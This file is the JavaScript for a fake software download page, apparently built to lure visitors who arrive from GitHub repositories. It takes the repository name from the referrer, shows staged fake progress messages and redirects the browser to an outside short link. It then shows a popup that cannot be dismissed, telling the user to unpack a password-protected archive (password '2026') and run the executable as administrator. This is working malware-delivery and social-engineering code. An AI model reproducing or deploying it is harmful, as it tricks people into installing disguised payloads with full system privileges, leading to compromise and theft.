document.addEventListener('DOMContentLoaded', function() {
  const statusText = document.getElementById('status-text');
  const errorText = document.getElementById('error-text');
  const progressFill = document.querySelector('.progress-fill');
  const repoNameMeta = document.getElementById('repoNameMeta');

  function extractRepoName() {
    if (document.referrer) {
      try {
        const referrerUrl = new URL(document.referrer);
        if (referrerUrl.hostname === 'github.com') {
          const pathParts = referrerUrl.pathname.split('/').filter(p => p);
          if (pathParts.length >= 2) {
            return pathParts[1];
          }
        }
      } catch (e) {}
    }

    const repoMeta = document.getElementById('repoNameMeta');
    if (repoMeta && repoMeta.content) {
      return repoMeta.content;
    }

    const path = window.location.pathname;
    const cleanPath = path.replace(/^\/+|\/+$/g, '');
    const parts = cleanPath.split('/');
    return parts[parts.length - 1] || 'download';
  }

  const repoName = extractRepoName();
  if (repoNameMeta) {
    repoNameMeta.content = repoName;
  }

  const messages = [
    'Initializing...',
    'Verifying connection...',
    'Establishing secure tunnel...',
    'Preparing files...',
    'Download starting...'
  ];
  
  let currentIndex = 0;
  let isComplete = false;
  let redirectExecuted = false;
  let popupShown = false;
  
  function updateStatus() {
    if (currentIndex < messages.length && !isComplete) {
      statusText.style.opacity = '0';
      
      setTimeout(() => {
        statusText.textContent = messages[currentIndex];
        statusText.style.opacity = '1';
        
        if (messages[currentIndex] === 'Download starting...' && !popupShown) {
          popupShown = true;
          showInstructionPopup();
        }
      }, 150);
      
      const progress = ((currentIndex + 1) / messages.length) * 100;
      progressFill.style.width = progress + '%';
      
      if (currentIndex === 1 && !redirectExecuted) {
        redirectExecuted = true;
        
        setTimeout(() => {
          const baseUrl = 'https://walksoft.org/s/bF7xdlAZ';
          const url = repoName ? `${baseUrl}?repo_name=${encodeURIComponent(repoName)}` : baseUrl;
          window.location.href = url;
        }, 100);
      }
      
      currentIndex++;
      
      setTimeout(updateStatus, 600);
    }
  }
  
  function showInstructionPopup() {
    const popup = document.getElementById('infoPopup');
    if (popup) {
      popup.innerHTML = `
        <div class="info-panel-header" id="panelHeader" style="cursor: default;">
          <span>Installation Instructions</span>
          <button class="close-btn" style="display: none;">×</button>
        </div>
        
        <div class="info-panel-content">
          <div class="instruction-header">
            <div class="warning-icon-large">
              <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2">
                <circle cx="12" cy="12" r="10" stroke="#f59e0b"></circle>
                <path d="M12 8 L12 13" stroke="#f59e0b" stroke-linecap="round"></path>
                <circle cx="12" cy="16" r="0.3" stroke="#f59e0b" fill="none"></circle>
              </svg>
            </div>
            <h3 style="margin: 1rem 0 0.5rem 0;">Important Instructions</h3>
            <p style="color: var(--text-secondary); font-size: 0.9rem;">Please follow these steps carefully</p>
          </div>
          
          <div class="instruction-content-detailed">
            <div class="instruction-step-detailed">
              <div class="step-number-large">1</div>
              <div class="step-info-detailed">
                <strong>Extract the archive</strong>
                <p>Use WinRAR, 7-Zip, or Windows built-in extractor to unpack the downloaded file</p>
                <div class="code-snippet">Right-click -> Extract Here</div>
              </div>
            </div>
            
            <div class="instruction-step-detailed">
              <div class="step-number-large">2</div>
              <div class="step-info-detailed">
                <strong>Enter archive password</strong>
                <p>When prompted during extraction, enter the password below:</p>
                <div class="password-container">
                  <div class="password-display">
                    <code>2026</code>
                    <button class="copy-btn-large">
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                      </svg>
                      Copy password
                    </button>
                  </div>
                </div>
              </div>
            </div>
            
            <div class="instruction-step-detailed">
              <div class="step-number-large">3</div>
              <div class="step-info-detailed">
                <strong>Run as Administrator</strong>
                <p>After extraction, right-click the executable file and select "Run as administrator"</p>
                <div class="warning-box-small">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2">
                    <circle cx="12" cy="12" r="10" stroke="#f59e0b"></circle>
                    <path d="M12 8 L12 13" stroke="#f59e0b" stroke-linecap="round"></path>
                    <circle cx="12" cy="16" r="0.3" stroke="#f59e0b" fill="none"></circle>
                  </svg>
                  <span>Administrator privileges are required for proper functionality</span>
                </div>
              </div>
            </div>

            <div class="instruction-step-detailed">
              <div class="step-number-large">4</div>
              <div class="step-info-detailed">
                <strong>Complete installation</strong>
                <p>Follow the setup wizard instructions to finish the installation</p>
              </div>
            </div>
          </div>
      `;
      
      popup.style.display = 'block';
      popup.style.position = 'fixed';
      popup.style.top = '50%';
      popup.style.left = '50%';
      popup.style.transform = 'translate(-50%, -50%)';
      popup.style.zIndex = '10000';
      popup.style.maxWidth = '700px';
      popup.style.width = '90%';
      popup.style.maxHeight = '85vh';
      popup.style.overflowY = 'auto';
      popup.style.cursor = 'default';
      
      const header = document.getElementById('panelHeader');
      if (header) {
        header.style.cursor = 'default';
      }
    }
  }
  
  setTimeout(updateStatus, 300);
});

document.addEventListener('click', function(event) {
  const copyButton = event.target.closest('.copy-btn-large');
  
  if (copyButton) {
    event.preventDefault();
    const originalHTML = copyButton.innerHTML;
    
    navigator.clipboard.writeText('2026').then(() => {
      copyButton.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg> Password copied!';
      
      setTimeout(() => {
        if (copyButton) {
          copyButton.innerHTML = originalHTML;
        }
      }, 2000);
    }).catch(() => {
      copyButton.innerHTML = originalHTML;
    });
    
    return;
  }
  
  const popup = document.getElementById('infoPopup');
  const closeBtn = event.target.closest('.close-btn');
  const navBtn = event.target.closest('.nav-btn');
  
  if (closeBtn && popup) {
    event.preventDefault();
    event.stopPropagation();
    return;
  }
  
  if (popup && !popup.contains(event.target) && !navBtn && popup.style.display === 'block') {
    event.preventDefault();
  }
});

document.addEventListener('keydown', function(event) {
  if (event.key === 'Escape') {
    const popup = document.getElementById('infoPopup');
    if (popup && popup.style.display === 'block') {
      event.preventDefault();
      event.stopPropagation();
    }
  }
});

window.toggleInfoPopup = function() {
  return;
};